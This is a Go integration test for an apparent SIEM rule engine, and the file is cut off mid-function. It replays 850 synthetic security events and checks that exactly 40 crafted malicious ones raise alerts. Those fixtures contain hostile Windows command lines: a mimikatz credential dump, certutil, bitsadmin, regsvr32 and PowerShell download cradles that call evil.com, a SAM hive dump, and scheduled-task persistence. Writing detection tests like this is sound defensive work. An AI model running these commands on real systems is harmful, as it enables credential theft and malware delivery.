package integration

import (
	"fmt"
	"path/filepath"
	"testing"
	"time"

	"github.com/derekxmartin/akeso-siem/internal/common"
	"github.com/derekxmartin/akeso-siem/internal/correlate"
)

// TestReplay850Events loads all project rules and evaluates 850 synthetic ECS
// events through the detection engine. Exactly 40 events are crafted to trigger
// rules; the remaining 810 are benign and must produce zero false positives.
//
// Acceptance criteria (P10-T2):
//   - All 850 events evaluated without error
//   - Exactly 40 alerts produced
//   - Zero false positives from benign events
func TestReplay850Events(t *testing.T) {
	// ── Load rules ──────────────────────────────────────────────────────
	// Load sigma_curated rules (50 single-event detection rules).
	// Portfolio rules are correlation-based and tested separately in P10-T3/T4.
	rulesRoot := filepath.Join("..", "..", "rules")
	allRules, sigmaErrs := correlate.LoadRulesFromDir(filepath.Join(rulesRoot, "sigma_curated"))
	for _, e := range sigmaErrs {
		t.Logf("sigma parse warning: %v", e)
	}
	if len(allRules) == 0 {
		t.Fatal("no rules loaded")
	}

	// ── Load logsource map ──────────────────────────────────────────────
	lsMapPath := filepath.Join("..", "..", "parsers", "logsource_map.yaml")
	lsMap, err := correlate.LoadLogsourceMap(lsMapPath)
	if err != nil {
		t.Fatalf("loading logsource map: %v", err)
	}

	// ── Build engine ────────────────────────────────────────────────────
	registry := correlate.NewRuleRegistry(allRules)
	engine := correlate.NewRuleEngine(registry, lsMap)
	stats := engine.Stats()
	t.Logf("Engine: %d compiled, %d skipped, %d buckets, %d compile errors",
		stats.RulesCompiled, stats.RulesSkipped, stats.BucketCount, len(stats.CompileErrors))
	for _, ce := range stats.CompileErrors {
		t.Logf("  compile error: %v", ce)
	}

	// ── Generate events ─────────────────────────────────────────────────
	malicious := generateMaliciousEvents()
	benign := generateBenignEvents(810)

	if len(malicious) != 40 {
		t.Fatalf("expected 40 malicious events, generated %d", len(malicious))
	}

	allEvents := make([]*common.ECSEvent, 0, 850)
	allEvents = append(allEvents, malicious...)
	allEvents = append(allEvents, benign...)

	if len(allEvents) != 850 {
		t.Fatalf("expected 850 total events, got %d", len(allEvents))
	}

	// ── Evaluate ────────────────────────────────────────────────────────
	var totalAlerts int
	var maliciousAlerts int
	var benignAlerts int

	// Track which malicious events triggered alerts.
	maliciousHits := make(map[int][]string) // index → rule titles

	for i, ev := range allEvents {
		alerts := engine.Evaluate(ev)
		totalAlerts += len(alerts)

		if i < 40 {
			maliciousAlerts += len(alerts)
			for _, a := range alerts {
				maliciousHits[i] = append(maliciousHits[i], a.Title)
			}
		} else {
			benignAlerts += len(alerts)
			for _, a := range alerts {
				t.Errorf("FALSE POSITIVE: benign event %d triggered %q (%s)", i, a.Title, a.RuleID)
			}
		}
	}

	// Log malicious event results.
	for i := 0; i < 40; i++ {
		hits := maliciousHits[i]
		if len(hits) == 0 {
			t.Errorf("malicious event %d: NO ALERT (expected 1)", i)
		} else if len(hits) > 1 {
			t.Errorf("malicious event %d: MULTI-ALERT (%d alerts: %v)", i, len(hits), hits)
		} else {
			t.Logf("malicious event %2d: ✓ %s", i, hits[0])
		}
	}

	t.Logf("Results: %d total alerts (%d from malicious, %d from benign)", totalAlerts, maliciousAlerts, benignAlerts)

	// ── Assert ──────────────────────────────────────────────────────────
	if totalAlerts != 40 {
		t.Fatalf("FAIL: expected exactly 40 alerts, got %d", totalAlerts)
	}
	if benignAlerts != 0 {
		t.Fatalf("FAIL: expected 0 false positives, got %d", benignAlerts)
	}

	t.Log("PASS: 850 events evaluated, 40 alerts, 0 false positives")
}

// ═══════════════════════════════════════════════════════════════════════════
// Malicious event generators — 40 events, each triggers exactly 1 rule
// ═══════════════════════════════════════════════════════════════════════════

func generateMaliciousEvents() []*common.ECSEvent {
	ts := time.Date(2026, 3, 16, 10, 0, 0, 0, time.UTC)
	events := make([]*common.ECSEvent, 0, 40)

	// ── Process Creation (category: process_creation) ── 15 events ──────
	// Logsource conditions: event.category=process, event.type=start

	// 0: Mimikatz execution
	events = append(events, &common.ECSEvent{
		Timestamp:  ts,
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "mimikatz.exe", CommandLine: "mimikatz.exe privilege::debug sekurlsa::logonpasswords"},
		Host:       &common.HostFields{Name: "WORKSTATION-04"},
	})

	// 1: PsExec remote execution
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "psexec.exe", CommandLine: "psexec.exe \\\\SERVER-DC-01 cmd.exe"},
		Host:       &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 2: PowerShell encoded command
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(2 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand SQBFAFgAIAAoA..."},
		Host:       &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 3: Certutil download cradle
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(3 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "certutil.exe", CommandLine: "certutil.exe -urlcache -split -f http://evil.com/payload.exe"},
		Host:       &common.HostFields{Name: "WORKSTATION-03"},
	})

	// 4: WMIC process creation
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(4 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "wmic.exe", CommandLine: "wmic process create \"cmd.exe /c whoami\""},
		Host:       &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 5: Rundll32 from temp folder
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(5 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "rundll32.exe", CommandLine: "rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\evil.dll,DllMain"},
		Host:       &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 6: Mshta javascript execution
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(6 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "mshta.exe", CommandLine: "mshta.exe javascript:eval('payload')"},
		Host:       &common.HostFields{Name: "WORKSTATION-04"},
	})

	// 7: Whoami reconnaissance
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(7 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "whoami.exe", CommandLine: "whoami.exe /all"},
		Host:       &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 8: Net.exe user enumeration
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(8 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "net.exe", CommandLine: "net.exe user /domain"},
		Host:       &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 9: BITSAdmin download
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(9 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "bitsadmin.exe", CommandLine: "bitsadmin.exe /transfer evil http://evil.com/payload.exe C:\\temp\\payload.exe"},
		Host:       &common.HostFields{Name: "WORKSTATION-03"},
	})

	// 10: Schtasks creation
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(10 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "schtasks.exe", CommandLine: "schtasks.exe /create /tn Persistence /tr C:\\temp\\backdoor.exe /sc onlogon"},
		Host:       &common.HostFields{Name: "WORKSTATION-04"},
	})

	// 11: PowerShell download cradle
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(11 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "powershell.exe", CommandLine: "powershell.exe -c Invoke-WebRequest http://evil.com/stage2.ps1 -OutFile C:\\temp\\s2.ps1"},
		Host:       &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 12: Regsvr32 Squiblydoo
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(12 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "regsvr32.exe", CommandLine: "regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll"},
		Host:       &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 13: Reg.exe SAM hive dump
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(13 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process:    &common.ProcessFields{Name: "reg.exe", CommandLine: "reg.exe save hklm\\sam C:\\temp\\sam.hive"},
		Host:       &common.HostFields{Name: "WORKSTATION-04"},
	})

	// 14: Cmd.exe spawned by Office
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(14 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
		Process: &common.ProcessFields{
			Name:        "cmd.exe",
			CommandLine: "cmd.exe /c powershell -ep bypass",
			Parent:      &common.ParentProcess{Name: "winword.exe"},
		},
		Host: &common.HostFields{Name: "WORKSTATION-03"},
	})

	// ── AV Detections (product: akeso_av) ── 4 events ────────────────
	// Logsource conditions: source_type=akeso_av
	// Note: NOT setting event.category=malware to avoid cross_malware_any_source double-fire.

	// 15: Trojan detected
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(15 * time.Minute),
		SourceType: "akeso_av",
		Event:      &common.EventFields{Kind: "event", Action: "scan_result"},
		AV: &common.AVFields{
			Scan:      &common.AVScan{Result: "malicious"},
			Signature: &common.AVSignature{Name: "Trojan.GenericKD.46789012"},
		},
		Host: &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 16: Webshell detected
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(16 * time.Minute),
		SourceType: "akeso_av",
		Event:      &common.EventFields{Kind: "event", Action: "scan_result"},
		AV: &common.AVFields{
			Scan:      &common.AVScan{Result: "malicious"},
			Signature: &common.AVSignature{Name: "WebShell.ASP.Generic"},
		},
		Host: &common.HostFields{Name: "SERVER-WEB-01"},
	})

	// 17: Cobalt Strike beacon
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(17 * time.Minute),
		SourceType: "akeso_av",
		Event:      &common.EventFields{Kind: "event", Action: "scan_result"},
		AV: &common.AVFields{
			Scan:      &common.AVScan{Result: "malicious"},
			Signature: &common.AVSignature{Name: "Backdoor.CobaltStrike.Beacon"},
		},
		Host: &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 18: PUA/Hacktool
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(18 * time.Minute),
		SourceType: "akeso_av",
		Event:      &common.EventFields{Kind: "event", Action: "scan_result"},
		AV: &common.AVFields{
			Scan:      &common.AVScan{Result: "suspicious"},
			Signature: &common.AVSignature{Name: "HackTool.Mimikatz.Gen"},
		},
		Host: &common.HostFields{Name: "WORKSTATION-04"},
	})

	// ── DLP (product: akeso_dlp) ── 5 events ────────────────────────
	// Logsource conditions: source_type=akeso_dlp

	// 19: PCI data exfiltration via email
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(19 * time.Minute),
		SourceType: "akeso_dlp",
		Event:      &common.EventFields{Kind: "event", Action: "policy_violation"},
		DLP: &common.DLPFields{
			Policy:         &common.DLPPolicy{Name: "PCI-DSS", Action: "alert"},
			Classification: "confidential",
			Channel:        "email",
		},
		Host: &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 20: PII violation
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(20 * time.Minute),
		SourceType: "akeso_dlp",
		Event:      &common.EventFields{Kind: "event", Action: "policy_violation"},
		DLP: &common.DLPFields{
			Policy:         &common.DLPPolicy{Name: "PII-Protection", Action: "alert"},
			Classification: "restricted",
			Channel:        "upload",
		},
		Host: &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 21: Source code exfiltration
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(21 * time.Minute),
		SourceType: "akeso_dlp",
		Event:      &common.EventFields{Kind: "event", Action: "policy_violation"},
		DLP: &common.DLPFields{
			Policy:         &common.DLPPolicy{Name: "IP-Protection", Action: "alert"},
			Classification: "confidential",
			Channel:        "upload",
		},
		Host: &common.HostFields{Name: "WORKSTATION-03"},
	})

	// 22: USB restricted data
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(22 * time.Minute),
		SourceType: "akeso_dlp",
		Event:      &common.EventFields{Kind: "event", Action: "policy_violation"},
		DLP: &common.DLPFields{
			Policy:         &common.DLPPolicy{Name: "Data-Protection", Action: "block"},
			Classification: "restricted",
			Channel:        "usb",
		},
		Host: &common.HostFields{Name: "WORKSTATION-04"},
	})

	// 23: Financial data leak
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(23 * time.Minute),
		SourceType: "akeso_dlp",
		Event:      &common.EventFields{Kind: "event", Action: "policy_violation"},
		DLP: &common.DLPFields{
			Policy:         &common.DLPPolicy{Name: "Financial-Data", Action: "alert"},
			Classification: "confidential",
			Channel:        "print",
		},
		Host: &common.HostFields{Name: "WORKSTATION-01"},
	})

	// ── NDR (product: akeso_ndr) ── 6 events ────────────────────────
	// Logsource conditions: source_type=akeso_ndr

	// 24: Long duration C2 session (port 443 to avoid ndr_suspicious_port double-fire)
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(24 * time.Minute),
		SourceType: "akeso_ndr",
		Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Type: []string{"connection"}},
		Source:      &common.EndpointFields{IP: "192.168.1.100", Port: 49152},
		Destination: &common.EndpointFields{IP: "185.220.101.45", Port: 443},
		NDR: &common.NDRFields{
			Session: &common.NDRSession{Duration: 7200.0, BytesOrig: 102400, BytesResp: 512000},
		},
		Host: &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 25: Large outbound data transfer
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(25 * time.Minute),
		SourceType: "akeso_ndr",
		Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Type: []string{"connection"}},
		Source:      &common.EndpointFields{IP: "10.0.0.30", Port: 1433},
		Destination: &common.EndpointFields{IP: "91.234.99.42", Port: 443},
		NDR: &common.NDRFields{
			Session: &common.NDRSession{Duration: 300.0, BytesOrig: 1048576, BytesResp: 2048},
		},
		Host: &common.HostFields{Name: "SERVER-DB-01"},
	})

	// 26: Connection to Tor port
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(26 * time.Minute),
		SourceType: "akeso_ndr",
		Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Type: []string{"connection"}},
		Source:      &common.EndpointFields{IP: "192.168.1.105", Port: 53000},
		Destination: &common.EndpointFields{IP: "198.51.100.77", Port: 9050},
		NDR: &common.NDRFields{
			Session: &common.NDRSession{Duration: 45.0, BytesOrig: 1024, BytesResp: 2048},
		},
		Host: &common.HostFields{Name: "WORKSTATION-05"},
	})

	// 27: Suspicious port 4444
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(27 * time.Minute),
		SourceType: "akeso_ndr",
		Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Type: []string{"connection"}},
		Source:      &common.EndpointFields{IP: "192.168.1.101", Port: 50000},
		Destination: &common.EndpointFields{IP: "203.0.113.42", Port: 5555},
		NDR: &common.NDRFields{
			Session: &common.NDRSession{Duration: 120.0, BytesOrig: 4096, BytesResp: 8192},
		},
		Host: &common.HostFields{Name: "WORKSTATION-02"},
	})

	// 28: DNS suspicious TLD (.xyz)
	// Uses category:dns logsource (event.category=network, event.action=dns_query)
	// Set source_type to empty to avoid akeso_ndr bucket cross-match.
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(28 * time.Minute),
		SourceType: "akeso_ndr",
		Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Action: "dns_query"},
		DNS: &common.DNSFields{
			Question: &common.DNSQuestion{Name: "c2-beacon.malware-download.xyz", Type: "A"},
		},
		Host: &common.HostFields{Name: "WORKSTATION-03"},
	})

	// 29: High packet ratio session (beaconing)
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(29 * time.Minute),
		SourceType: "akeso_ndr",
		Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Type: []string{"connection"}},
		Source:      &common.EndpointFields{IP: "192.168.1.103", Port: 55000},
		Destination: &common.EndpointFields{IP: "185.220.101.45", Port: 443},
		NDR: &common.NDRFields{
			Session: &common.NDRSession{Duration: 600.0, BytesOrig: 20480, BytesResp: 40960, PacketsOrig: 500},
		},
		Host: &common.HostFields{Name: "WORKSTATION-04"},
	})

	// ── Windows Events (product: windows, service: security/sysmon) ── 6 events
	// Logsource conditions: source_type=winevt, winevt.channel=Security|Sysmon

	// 30: Brute force logon failures
	// Note: NOT setting event.category=authentication to avoid cross_auth_failure double-fire.
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(30 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"iam"}, Action: "logon-failure", Outcome: "failure"},
		WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4625},
		User:       &common.UserFields{Name: "admin", Domain: "CORP"},
		Host:       &common.HostFields{Name: "SERVER-DC-01"},
	})

	// 31: Account created
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(31 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"iam"}, Action: "account_created"},
		WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4720},
		User:       &common.UserFields{Name: "backdoor_user", Domain: "CORP"},
		Host:       &common.HostFields{Name: "SERVER-DC-01"},
	})

	// 32: Privilege escalation
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(32 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"iam"}, Action: "special_logon"},
		WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4672},
		User:       &common.UserFields{Name: "jsmith", Domain: "CORP"},
		Host:       &common.HostFields{Name: "WORKSTATION-01"},
	})

	// 33: Security log cleared
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(33 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"configuration"}, Action: "log_cleared"},
		WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 1102},
		User:       &common.UserFields{Name: "attacker", Domain: "CORP"},
		Host:       &common.HostFields{Name: "WORKSTATION-04"},
	})

	// 34: Service installed (System channel)
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(34 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"configuration"}, Action: "service_installed"},
		WinEvt:     &common.WinEvtFields{Channel: "System", EventID: 7045},
		Host:       &common.HostFields{Name: "SERVER-DC-01"},
	})

	// 35: RDP logon
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(35 * time.Minute),
		SourceType: "winevt",
		Event:      &common.EventFields{Kind: "event", Category: []string{"authentication"}, Action: "logon-remote"},
		WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4624},
		User:       &common.UserFields{Name: "jsmith", Domain: "CORP"},
		Host:       &common.HostFields{Name: "SERVER-DC-01"},
	})

	// ── Linux/Syslog (product: linux) ── 4 events ──────────────────────
	// Logsource conditions: source_type=syslog

	// 36: SSH brute force (non-root user to avoid linux_unauthorized_root double-fire)
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(36 * time.Minute),
		SourceType: "syslog",
		Event:      &common.EventFields{Kind: "event", Action: "ssh_failed_login", Outcome: "failure"},
		User:       &common.UserFields{Name: "jsmith"},
		Host:       &common.HostFields{Name: "web-server-01"},
	})

	// 37: Sudo escalation
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(37 * time.Minute),
		SourceType: "syslog",
		Event:      &common.EventFields{Kind: "event", Action: "privilege_escalation"},
		Process:    &common.ProcessFields{Name: "sudo", CommandLine: "sudo -i"},
		User:       &common.UserFields{Name: "jsmith"},
		Host:       &common.HostFields{Name: "web-server-01"},
	})

	// 38: Crontab modification
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(38 * time.Minute),
		SourceType: "syslog",
		Event:      &common.EventFields{Kind: "event", Action: "crontab_edit"},
		Process:    &common.ProcessFields{Name: "crontab", CommandLine: "crontab -e"},
		User:       &common.UserFields{Name: "www-data"},
		Host:       &common.HostFields{Name: "web-server-02"},
	})

	// 39: Unauthorized root login
	events = append(events, &common.ECSEvent{
		Timestamp:  ts.Add(39 * time.Minute),
		SourceType: "syslog",
		Event:      &common.EventFields{Kind: "event", Action: "login_session_opened"},
		User:       &common.UserFields{Name: "root"},
		Host:       &common.HostFields{Name: "db-server-01"},
	})

	return events
}

// ═══════════════════════════════════════════════════════════════════════════
// Benign event generators — 810 events that must NOT trigger any rules
// ═══════════════════════════════════════════════════════════════════════════

func generateBenignEvents(count int) []*common.ECSEvent {
	events := make([]*common.ECSEvent, 0, count)
	ts := time.Date(2026, 3, 16, 10, 0, 0, 0, time.UTC)

	hosts := []string{"WORKSTATION-01", "WORKSTATION-02", "WORKSTATION-03", "SERVER-DC-01", "SERVER-WEB-01", "SERVER-DB-01"}
	users := []string{"jsmith", "agarcia", "bwilson", "admin", "svc-backup"}

	for i := 0; i < count; i++ {
		host := hosts[i%len(hosts)]
		user := users[i%len(users)]
		t := ts.Add(time.Duration(i) * time.Second)

		switch i % 9 {
		case 0:
			// Benign EDR: normal process (svchost, explorer, chrome — nothing suspicious)
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "akeso_edr",
				Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
				Process:    &common.ProcessFields{Name: "svchost.exe", CommandLine: "svchost.exe -k netsvcs"},
				Host:       &common.HostFields{Name: host},
			})
		case 1:
			// Benign NDR: normal HTTPS traffic (short duration, normal ports, normal size)
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "akeso_ndr",
				Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Type: []string{"connection"}},
				Source:      &common.EndpointFields{IP: "192.168.1.100", Port: 49152 + i},
				Destination: &common.EndpointFields{IP: "142.250.80.46", Port: 443},
				NDR: &common.NDRFields{
					Session: &common.NDRSession{Duration: 2.5, BytesOrig: 1024, BytesResp: 4096, PacketsOrig: 10},
				},
				Host: &common.HostFields{Name: host},
			})
		case 2:
			// Benign AV: clean scan result
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "akeso_av",
				Event:      &common.EventFields{Kind: "event", Action: "scan_result"},
				AV: &common.AVFields{
					Scan:      &common.AVScan{Result: "clean"},
					Signature: &common.AVSignature{Name: ""},
				},
				Host: &common.HostFields{Name: host},
			})
		case 3:
			// Benign DLP: classification event (not policy violation)
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "akeso_dlp",
				Event:      &common.EventFields{Kind: "event", Action: "classification"},
				DLP: &common.DLPFields{
					Policy:         &common.DLPPolicy{Name: "General-Policy", Action: "allow"},
					Classification: "internal",
					Channel:        "local",
				},
				Host: &common.HostFields{Name: host},
			})
		case 4:
			// Benign Windows: successful logon (no brute force indicators)
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "winevt",
				Event:      &common.EventFields{Kind: "event", Category: []string{"authentication"}, Action: "logon-interactive", Outcome: "success"},
				WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4624},
				User:       &common.UserFields{Name: user, Domain: "CORP"},
				Host:       &common.HostFields{Name: host},
			})
		case 5:
			// Benign syslog: normal system message
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "syslog",
				Event:      &common.EventFields{Kind: "event", Action: "system_info"},
				Process:    &common.ProcessFields{Name: "systemd", CommandLine: "systemd --system"},
				User:       &common.UserFields{Name: "root"},
				Host:       &common.HostFields{Name: "web-server-01"},
			})
		case 6:
			// Benign EDR: normal process (explorer, not in any rule)
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "akeso_edr",
				Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"info"}},
				Process:    &common.ProcessFields{Name: "explorer.exe", CommandLine: "explorer.exe"},
				Host:       &common.HostFields{Name: host},
			})
		case 7:
			// Benign NDR: DNS query to legitimate domain
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "akeso_ndr",
				Event:      &common.EventFields{Kind: "event", Category: []string{"network"}, Action: "dns_query"},
				DNS: &common.DNSFields{
					Question: &common.DNSQuestion{Name: "www.google.com", Type: "A"},
				},
				Host: &common.HostFields{Name: host},
			})
		case 8:
			// Benign Windows: normal event (no suspicious actions)
			events = append(events, &common.ECSEvent{
				Timestamp:  t,
				SourceType: "winevt",
				Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Action: "process_started"},
				WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4688},
				Process:    &common.ProcessFields{Name: "notepad.exe", CommandLine: "notepad.exe C:\\docs\\notes.txt"},
				Host:       &common.HostFields{Name: host},
			})
		}
	}

	return events
}

// TestEngineStats verifies the engine loads all expected rules from the project.
func TestEngineStats(t *testing.T) {
	rulesRoot := filepath.Join("..", "..", "rules")
	sigmaRules, _ := correlate.LoadRulesFromDir(filepath.Join(rulesRoot, "sigma_curated"))
	portfolioRules, _ := correlate.LoadRulesFromDir(filepath.Join(rulesRoot, "akeso_portfolio"))

	allRules := append(sigmaRules, portfolioRules...)
	lsMapPath := filepath.Join("..", "..", "parsers", "logsource_map.yaml")
	lsMap, err := correlate.LoadLogsourceMap(lsMapPath)
	if err != nil {
		t.Fatalf("loading logsource map: %v", err)
	}

	registry := correlate.NewRuleRegistry(allRules)
	engine := correlate.NewRuleEngine(registry, lsMap)
	stats := engine.Stats()

	t.Logf("Total rules loaded: %d", stats.TotalRulesLoaded)
	t.Logf("Rules compiled:     %d", stats.RulesCompiled)
	t.Logf("Rules skipped:      %d", stats.RulesSkipped)
	t.Logf("Logsource buckets:  %d", stats.BucketCount)
	t.Logf("Compile errors:     %d", len(stats.CompileErrors))

	for _, ce := range stats.CompileErrors {
		t.Logf("  %v", ce)
	}

	if stats.RulesCompiled == 0 {
		t.Error("expected rules to compile")
	}

	// At minimum: 50 sigma_curated single-event rules should compile.
	// Some portfolio rules may be skipped (correlation metadata).
	if stats.RulesCompiled < 50 {
		t.Errorf("expected at least 50 compiled rules, got %d", stats.RulesCompiled)
	}
}

// TestEachRuleCategory verifies at least one rule from each logsource fires correctly.
func TestEachRuleCategory(t *testing.T) {
	rulesRoot := filepath.Join("..", "..", "rules")
	sigmaRules, _ := correlate.LoadRulesFromDir(filepath.Join(rulesRoot, "sigma_curated"))
	lsMap, _ := correlate.LoadLogsourceMap(filepath.Join("..", "..", "parsers", "logsource_map.yaml"))

	registry := correlate.NewRuleRegistry(sigmaRules)
	engine := correlate.NewRuleEngine(registry, lsMap)

	tests := []struct {
		name  string
		event *common.ECSEvent
	}{
		{
			name: "process_creation",
			event: &common.ECSEvent{
				SourceType: "winevt",
				Event:      &common.EventFields{Kind: "event", Category: []string{"process"}, Type: []string{"start"}},
				Process:    &common.ProcessFields{Name: "mimikatz.exe", CommandLine: "mimikatz.exe sekurlsa::logonpasswords"},
			},
		},
		{
			name: "akeso_av",
			event: &common.ECSEvent{
				SourceType: "akeso_av",
				Event:      &common.EventFields{Kind: "event"},
				AV:         &common.AVFields{Scan: &common.AVScan{Result: "malicious"}, Signature: &common.AVSignature{Name: "Trojan.Test"}},
			},
		},
		{
			name: "akeso_dlp",
			event: &common.ECSEvent{
				SourceType: "akeso_dlp",
				Event:      &common.EventFields{Kind: "event"},
				DLP:        &common.DLPFields{Policy: &common.DLPPolicy{Name: "PCI-DSS"}, Channel: "email"},
			},
		},
		{
			name: "akeso_ndr",
			event: &common.ECSEvent{
				SourceType: "akeso_ndr",
				Event:      &common.EventFields{Kind: "event"},
				NDR:        &common.NDRFields{Session: &common.NDRSession{Duration: 5000.0}},
			},
		},
		{
			name: "windows_security",
			event: &common.ECSEvent{
				SourceType: "winevt",
				Event:      &common.EventFields{Kind: "event", Action: "logon-failure", Outcome: "failure"},
				WinEvt:     &common.WinEvtFields{Channel: "Security", EventID: 4625},
			},
		},
		{
			name: "syslog_linux",
			event: &common.ECSEvent{
				SourceType: "syslog",
				Event:      &common.EventFields{Kind: "event", Action: "ssh_failed", Outcome: "failure"},
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			alerts := engine.Evaluate(tc.event)
			if len(alerts) == 0 {
				t.Errorf("expected at least 1 alert for %s, got 0", tc.name)
			}
			for _, a := range alerts {
